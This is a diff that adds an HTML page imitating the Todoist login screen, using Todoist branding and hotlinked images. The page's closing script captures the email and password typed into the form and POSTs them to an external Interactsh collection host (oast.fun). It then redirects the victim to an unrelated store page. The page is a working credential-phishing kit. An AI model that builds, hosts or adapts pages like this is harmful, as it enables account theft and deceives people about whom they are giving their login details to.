@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="en" class="theme_todoist">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Login to continue</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:image" content="https://app.todoist.com/assets/images/5811d27cc3a2767f.jpg">
+    <meta property="og:image:secure_url" content="https://app.todoist.com/assets/images/5811d27cc3a2767f.jpg">
+    <meta name="apple-itunes-app" content="app-id=572688855">
+    <meta name="description"
+        content="Trusted by 35+ million people and teams, the Todoist app is the world's favorite task manager and to-do list app. Organize your work and life, finally.">
+    <link rel="icon" href="https://app.todoist.com/favicon.ico" sizes="32x32">
+    <link rel="icon" href="https://app.todoist.com/todoist.svg" type="image/svg+xml">
+    <link rel="apple-touch-icon" href="https://app.todoist.com/apple-touch-icon.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root {
+            --default-light-actionable-idle: #444;
+            --button-large-height: 48px;
+            --button-large-border-radius: 8px;
+            --button-large-font-size: 18px;
+            --button-large-font-weight: 700;
+            --error-border: #dc4c3e;
+            --brand-secondary-dark: #fde8d9;
+            --brand-secondary-light: #fff9f3;
+            --product-library-background-base-primary: #ffffff;
+            --reactist-border-radius-large: 8px;
+            --reactist-spacing-xlarge: 24px;
+            --product-library-shadow-raised-1: 0px 2px 8px rgba(0, 0, 0, 0.08);
+            --product-library-display-accent-primary-tint: #d1453b;
+        }
+
+        html,
+        body,
+        #todoist_app {
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, Segoe UI, Roboto, Noto Sans, Ubuntu, Cantarell, Helvetica Neue, Noto, Oxygen-Sans, Cantrell, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;
+            position: relative;
+            overflow-y: auto;
+            background-color: var(--product-library-background-base-primary);
+        }
+
+        .authContainer {
+            display: flex;
+            min-height: 100%;
+            width: 100%;
+        }
+
+        .leftColumn {
+            width: 50%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
+        }
+
+        .rightColumn {
+            width: 50%;
+            background-color: var(--brand-secondary-light);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        
+        @media (max-width: 992px) {
+            .rightColumn {
+                display: none;
+            }
+            .leftColumn {
+                width: 100%;
+                padding: 1rem;
+            }
+        }
+
+        .formContainer {
+            max-width: 350px;
+            width: 100%;
+        }
+
+        .providerButton {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: var(--button-large-height);
+            border-radius: var(--button-large-border-radius);
+            font-size: 15px;
+            font-weight: 600;
+            border: 1px solid #ddd;
+            background-color: #fff;
+            margin-bottom: 1rem;
+            cursor: pointer;
+            text-decoration: none;
+            color: #202020;
+        }
+
+        .providerButton svg {
+            margin-right: 10px;
+        }
+
+        .appleButton {
+             background-color: #000;
+             color: #fff;
+             border: none;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #aaa;
+            margin: 1.5rem 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .divider:not(:empty)::before {
+            margin-right: .25em;
+        }
+
+        .divider:not(:empty)::after {
+            margin-left: .25em;
+        }
+
+        .inputGroup {
+            margin-bottom: 1.5rem;
+        }
+
+        .inputGroup label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        .inputGroup input {
+            width: 100%;
+            padding: 0.75rem;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            font-size: 16px;
+        }
+        
+        .inputGroup input:focus {
+            outline: none;
+            border-color: #d1453b;
+            box-shadow: 0 0 0 2px rgba(209, 69, 59, 0.2);
+        }
+
+        .loginButton {
+            width: 100%;
+            padding: 0.75rem;
+            border: none;
+            border-radius: 8px;
+            background-color: #d1453b;
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+        
+        .loginButton:hover {
+            background-color: #b83b30;
+        }
+
+        .authLink {
+            color: var(--product-library-display-accent-primary-tint);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .authLink:hover {
+            text-decoration: underline;
+        }
+
+        .illustration img {
+            max-width: 450px;
+            width: 100%;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="todoist_app">
+        <div class="authContainer">
+            <div class="leftColumn">
+                <div class="formContainer">
+                    <div class="flex justify-between items-center mb-8">
+                        <a href="https://todoist.com/" aria-label="Todoist Homepage">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="127" height="32" fill="none" viewBox="0 0 127 32"><g clip-path="url(#todoist-extended-logo_svg__a)"><path fill="#E44232" fill-rule="evenodd" d="M3.92 0h23.947c2.195 0 3.99 1.8 3.99 4v24c0 2.2-1.795 4-3.99 4H3.919c-2.195 0-3.99-1.8-3.99-4v-5.374l.056.033a944 944 0 0 0 5.37 3.12c.477.27.934.264 1.394-.002l6.224-3.59.116-.067.003-.002.018-.01.065-.038 6.496-3.746c.276-.16.29-.651-.02-.829l-.217-.123v-.001h-.001c-.316-.18-.724-.413-.898-.516a1.02 1.02 0 0 0-.995.012c-.155.09-10.479 6.039-10.824 6.235a1.34 1.34 0 0 1-1.336 0l-5.452-3.175v-2.693l.057.033c1.362.795 4.581 2.674 5.37 3.12.477.27.934.264 1.394-.002l6.353-3.664.024-.014.004-.002c3.188-1.84 6.4-3.691 6.54-3.773.277-.16.291-.651-.019-.828l-.217-.124c-.315-.18-.725-.414-.9-.517a1.02 1.02 0 0 0-.994.012c-.155.09-10.479 6.039-10.824 6.235a1.34 1.34 0 0 1-1.336 0l-5.452-3.174v-2.693l.056.032c1.361.795 4.582 2.674 5.37 3.12.478.27.935.264 1.395-.002l6.36-3.668.008-.005h.002l.08-.047L19.67 7.54c.276-.16.29-.65-.02-.828l-.217-.124c-.316-.18-.725-.414-.9-.516a1.02 1.02 0 0 0-.994.012c-.155.089-10.479 6.038-10.824 6.235a1.34 1.34 0 0 1-1.336 0L-.072 9.143V4c0-2.2 1.796-4 3.991-4" clip-rule="evenodd"></path><path fill="#fff" d="m6.749 14.993 6.36-3.668.008-.005c3.192-1.84 6.412-3.698 6.553-3.78.277-.16.29-.65-.019-.828l-.217-.124c-.316-.18-.725-.414-.9-.516a1.02 1.02 0 0 0-.995.012c-.154.089-10.478 6.038-10.823 6.235a1.34 1.34 0 0 1-1.336 0L-.072 9.143v2.698l.056.033c1.361.795 4.582 2.674 5.37 3.12.478.27.935.264 1.395-.002"></path><path fill="#fff" d="m6.749 20.385 6.352-3.664.024-.014 6.545-3.775c.277-.16.29-.651-.019-.828l-.217-.124c-.316-.18-.725-.414-.9-.517a1.02 1.02 0 0 0-.995.012c-.154.09-10.478 6.039-10.823 6.235a1.34 1.34 0 0 1-1.336 0l-5.452-3.174v2.698l.057.033c1.362.795 4.581 2.674 5.37 3.12.477.27.934.264 1.394-.002"></path><path fill="#fff" d="m13.11 22.108-6.361 3.669c-.46.265-.917.272-1.394.002a945 945 0 0 1-5.37-3.12l-.057-.033v-2.699l5.452 3.175c.412.239.923.235 1.336 0 .345-.196 10.669-6.146 10.823-6.235.372-.214.773-.142.995-.012.175.103.584.336.9.517l.217.123c.31.178.296.669.02.829z"></path><path fill="#E44232" fill-rule="evenodd" d="M55.528 19.082c0 .515.088 1.015.263 1.492q.261.72.773 1.273.51.554 1.228.884t1.627.331 1.628-.33a3.9 3.9 0 0 0 1.228-.885 3.8 3.8 0 0 0 .772-1.273q.26-.717.26-1.492 0-.774-.26-1.494a3.8 3.8 0 0 0-.772-1.271 3.9 3.9 0 0 0-1.228-.885 3.85 3.85 0 0 0-1.628-.333q-.91.001-1.627.333a3.9 3.9 0 0 0-1.229.885 3.7 3.7 0 0 0-.772 1.27q-.263.721-.263 1.495m-3.309 0q0-1.576.566-2.862a6.7 6.7 0 0 1 1.531-2.198 6.8 6.8 0 0 1 2.288-1.411 8 8 0 0 1 2.815-.498q1.489 0 2.813.498a6.8 6.8 0 0 1 2.29 1.41 6.7 6.7 0 0 1 1.531 2.199q.566 1.285.566 2.862 0 1.576-.566 2.862a6.7 6.7 0 0 1-1.53 2.198 6.75 6.75 0 0 1-2.29 1.409 7.9 7.9 0 0 1-2.814.497q-1.49.001-2.815-.497a6.7 6.7 0 0 1-2.288-1.409 6.7 6.7 0 0 1-1.53-2.198q-.567-1.286-.567-2.862M71.472 19.086q0 .774.263 1.491.26.722.772 1.274.51.553 1.228.884t1.627.33 1.628-.33a3.763 3.763 0 0 0 2-2.158q.26-.717.26-1.491t-.26-1.495a3.78 3.78 0 0 0-2-2.155 3.85 3.85 0 0 0-1.627-.333 3.85 3.85 0 0 0-1.628.333 3.9 3.9 0 0 0-1.228.884q-.51.554-.773 1.271-.262.722-.262 1.494m7.835 4.643h-.056q-.717 1.218-1.93 1.771a6.3 6.3 0 0 1-2.62.552q-1.545.001-2.747-.538a6.15 6.15 0 0 1-2.054-1.48 6.3 6.3 0 0 1-1.297-2.213 8.3 8.3 0 0 1-.44-2.736q-.002-1.465.469-2.738a6.8 6.8 0 0 1 1.309-2.212 6.1 6.1 0 0 1 2.027-1.478 6.2 6.2 0 0 1 2.593-.54q.939 0 1.657.193.716.194 1.268.5.552.305.938.648.387.347.634.677h.083v-7.31c0-.332.262-.722.722-.722h1.87c.432 0 .72.364.72.721v18.174c0 .461-.391.723-.72.723H80.03a.73.73 0 0 1-.723-.722zM87.963 19.082c0 .515.088 1.015.263 1.492q.261.72.773 1.273.51.554 1.228.884.717.33 1.627.331.91 0 1.628-.33.717-.332 1.228-.885.51-.553.772-1.273.26-.717.26-1.492 0-.774-.26-1.494a3.8 3.8 0 0 0-.772-1.271 3.9 3.9 0 0 0-1.228-.885 3.85 3.85 0 0 0-1.628-.333q-.91.001-1.627.333t-1.228.885q-.512.552-.773 1.27-.263.721-.263 1.495m-3.309 0q0-1.576.566-2.862a6.7 6.7 0 0 1 1.531-2.198 6.8 6.8 0 0 1 2.288-1.411 8 8 0 0 1 2.815-.498q1.49 0 2.813.498a6.8 6.8 0 0 1 2.29 1.41 6.7 6.7 0 0 1 1.532 2.199q.565 1.285.566 2.862 0 1.576-.567 2.862a6.7 6.7 0 0 1-1.53 2.198 6.75 6.75 0 0 1-2.29 1.409 7.9 7.9 0 0 1-2.814.497q-1.49.001-2.815-.497a6.7 6.7 0 0 1-2.288-1.409 6.7 6.7 0 0 1-1.53-2.198q-.567-1.286-.567-2.862M100.723 7.94q0-.802.592-1.398.597-.594 1.505-.594.91 0 1.531.568.62.566.622 1.424-.001.857-.622 1.424-.62.567-1.531.567-.908 0-1.505-.596-.592-.593-.592-1.395M114.388 16.123c-.33 0-.573-.25-.615-.36-.275-.723-1.152-.994-1.86-.994-1.117 0-1.993.518-1.993 1.41 0 .863.848 1.04 1.372 1.198.575.175 1.673.415 2.278.557a7.4 7.4 0 0 1 1.725.637c1.757.915 2.008 2.353 2.008 3.22 0 3.196-3.161 4.257-5.355 4.257-1.691 0-4.868-.257-5.566-3.488-.068-.315.21-.798.72-.798h1.828c.36 0 .602.263.672.47.235.649.982 1.139 2.24 1.139 1.351 0 2.149-.537 2.149-1.25 0-.462-.261-.872-.602-1.104-1.024-.696-3.556-.775-4.931-1.508-.526-.28-1.848-.922-1.848-3.11 0-3.014 2.735-4.286 5.137-4.286 3.544 0 4.844 2.244 4.991 3.076.081.459-.176.934-.691.934zM117.573 14.48v-1.372c0-.328.258-.721.716-.721h1.765v-3.37c0-.36.244-.58.429-.66.109-.049 1.097-.48 1.885-.825.551-.227.997.228.997.666v4.189h2.922c.451 0 .72.395.72.721v1.374a.744.744 0 0 1-.72.724h-2.922v5.807c0 .664-.018 1.182.235 1.566.232.351.572.481 1.254.481.196 0 .37-.032.518-.083a.7.7 0 0 1 .865.318c.216.418.463.877.635 1.206.19.361.038.824-.31.993-.56.273-1.336.494-2.4.494-.883 0-1.383-.097-1.941-.29a3.35 3.35 0 0 1-1.415-1c-.323-.396-.483-.926-.602-1.516-.121-.59-.15-1.305-.15-2.08v-5.896h-1.761c-.462 0-.72-.4-.72-.726M41.836 14.48v-1.372c0-.328.258-.721.715-.721h2.017v-3.37c0-.36.244-.58.429-.66l1.885-.825c.551-.227.997.228.997.666v4.189h2.922c.451 0 .72.395.72.721v1.374a.745.745 0 0 1-.72.724H47.88v5.807c0 .664-.018 1.182.235 1.566.232.351.572.481 1.254.481.196 0 .37-.032.518-.083a.704.704 0 0 1 .865.318c.216.418.463.877.636 1.206.19.361.037.824-.31.993-.561.273-1.337.494-2.401.494-.883 0-1.382-.097-1.941-.29a3.34 3.34 0 0 1-1.414-1c-.324-.396-.484-.926-.603-1.516-.121-.59-.15-1.305-.15-2.08v-5.896h-2.012c-.462 0-.72-.4-.72-.726M101.891 25.72h1.871c.396 0 .72-.324.72-.72V13.107a.723.723 0 0 0-.72-.722h-1.871a.723.723 0 0 0-.72.722V25c0 .397.324.722.72.722" clip-rule="evenodd"></path></g><defs><clippath id="todoist-extended-logo_svg__a"><path fill="#fff" d="M0 0h127v32H0z"></path></clippath></defs></svg>
+                        </a>
+                    </div>
+                    <h1 class="text-3xl font-bold mb-6">Log in</h1>
+                    
+                    <a href="#" class="providerButton">
+                         <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 18 18"><g fill="none" fill-rule="evenodd"><path fill="#4285F4" d="M17.64 9.205q-.002-.958-.164-1.841H9v3.481h4.844a4.14 4.14 0 0 1-1.796 2.716v2.259h2.908c1.702-1.567 2.684-3.875 2.684-6.615"></path><path fill="#34A853" d="M9 18c2.43 0 4.467-.806 5.956-2.18l-2.908-2.259c-.806.54-1.837.86-3.048.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332A9 9 0 0 0 9 18"></path><path fill="#FBBC05" d="M3.964 10.71A5.4 5.4 0 0 1 3.682 9c0-.593.102-1.17.282-1.71V4.958H.957A9 9 0 0 0 0 9c0 1.452.348 2.827.957 4.042z"></path><path fill="#EA4335" d="M9 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.463.891 11.426 0 9 0A9 9 0 0 0 .957 4.958L3.964 7.29C4.672 5.163 6.656 3.58 9 3.58"></path><path d="M0 0h18v18H0z"></path></g></svg>
+                        Continue with Google
+                    </a>
+                     <a href="#" class="providerButton">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="none" viewBox="0 0 18 18"><mask id="facebook-icon_svg__a" width="18" height="18" x="0" y="0" maskUnits="userSpaceOnUse" style="mask-type: alpha;"><path fill="#fff" fill-rule="evenodd" d="M.001 0H18v17.89H.001z" clip-rule="evenodd"></path></mask><g mask="url(#facebook-icon_svg__a)"><path fill="#1877F2" fill-rule="evenodd" d="M18 9a9 9 0 1 0-10.406 8.89v-6.288H5.309V9h2.285V7.017c0-2.255 1.343-3.501 3.4-3.501.984 0 2.014.175 2.014.175v2.215h-1.135c-1.118 0-1.467.694-1.467 1.406V9h2.496l-.399 2.602h-2.097v6.289C14.71 17.216 18 13.492 18 9" clip-rule="evenodd"></path></g><path fill="#fff" fill-rule="evenodd" d="m12.503 11.602.4-2.602h-2.497V7.312c0-.712.349-1.406 1.467-1.406h1.135V3.691s-1.03-.175-2.015-.175c-2.056 0-3.4 1.246-3.4 3.501V9H5.31v2.602h2.285v6.289a9 9 0 0 0 2.812 0V11.6z" clip-rule="evenodd"></path></svg>
+                        Continue with Facebook
+                    </a>
+                     <a href="#" class="providerButton appleButton">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" preserveAspectRatio="xMidYMid" viewBox="0 0 256 315" style="filter: invert(1);"><path fill="currentColor" d="M214 167c0 48 42 63 42 64s-7 22-22 44c-13 20-26 39-48 39-21 0-28-12-52-12s-31 12-51 12c-21 1-37-20-50-39-27-39-48-111-20-159 14-24 39-39 65-39 21-1 40 13 52 13s36-16 60-14c11 0 39 4 58 31-2 1-35 20-34 60M174 50c11-13 19-32 17-50-16 1-35 11-47 24a66 66 0 0 0-16 48c17 2 35-9 46-22"></path></svg>
+                        Continue with Apple
+                    </a>
+
+                    <div class="divider">OR</div>
+
+                    <form id="loginForm">
+                        <div class="inputGroup">
+                            <label for="email">Email</label>
+                            <input type="email" id="email" placeholder="Enter your email...">
+                        </div>
+                        <div class="inputGroup">
+                            <label for="password">Password</label>
+                            <input type="password" id="password" placeholder="Enter your password...">
+                        </div>
+                        <button type="submit" class="loginButton">Log in</button>
+                    </form>
+
+                    <div class="text-center mt-4 text-sm">
+                        <a href="#" class="authLink">Forgot your password?</a>
+                    </div>
+                    <div class="text-center mt-4 text-xs text-gray-500">
+                        By continuing with Google, Apple, or Email, you agree to Todoist’s <a href="#" class="authLink">Terms of Service</a> and <a href="#" class="authLink">Privacy Policy</a>.
+                    </div>
+
+                    <hr class="my-6">
+                    
+                    <div class="text-center text-sm">
+                        Don’t have an account? <a href="#" class="authLink">Sign up</a>
+                    </div>
+                </div>
+            </div>
+            <div class="rightColumn">
+                <div class="illustration">
+                    <img src="https://app.todoist.com/assets/images/dd247893a7740afd8f6a394c34a243a3.png" alt="">
+                </div>
+            </div>
+        </div>
+    </div>
+     <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+          // Prevent the default form submission behavior
+          event.preventDefault();
+    
+          // Get the values entered by the user
+          var email = document.getElementById('email').value;
+          var password = document.getElementById('password').value;
+    
+          // Log the email and password
+          console.log("Email:", email);
+          console.log("Password:", password);
+    
+          // Send the email and password to Interactsh
+          fetch('https://jygebpzicbhgdqvffjmxcecsqwn93r1g3.oast.fun', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ email: email, password: password })
+          })
+          .then(response => {
+            // Redirect the user to the specified link
+            window.location.href = 'https://gfal.market/store/elemental-raiders';
+          })
+          .catch(error => console.error('Error:', error));
+        });
+      </script>
+</body>
+
+</html>
+
